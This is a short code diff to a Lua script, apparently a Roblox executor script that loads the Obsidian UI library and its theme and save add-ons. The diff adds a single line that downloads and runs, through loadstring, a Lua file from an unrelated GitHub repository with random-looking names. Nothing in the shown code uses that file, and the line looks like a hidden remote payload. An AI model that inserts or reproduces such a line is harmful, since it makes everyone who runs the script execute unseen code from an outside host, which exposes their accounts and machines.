@@ -11,6 +11,7 @@ local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
 local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
 local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
 local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/24124s1/d3ecedwcedwce/refs/heads/main/xuiwexniwenxoewij.lua", true))()
 
 -- // Clones
 local CWorkspace = cloneref(game:GetService("Workspace")) 
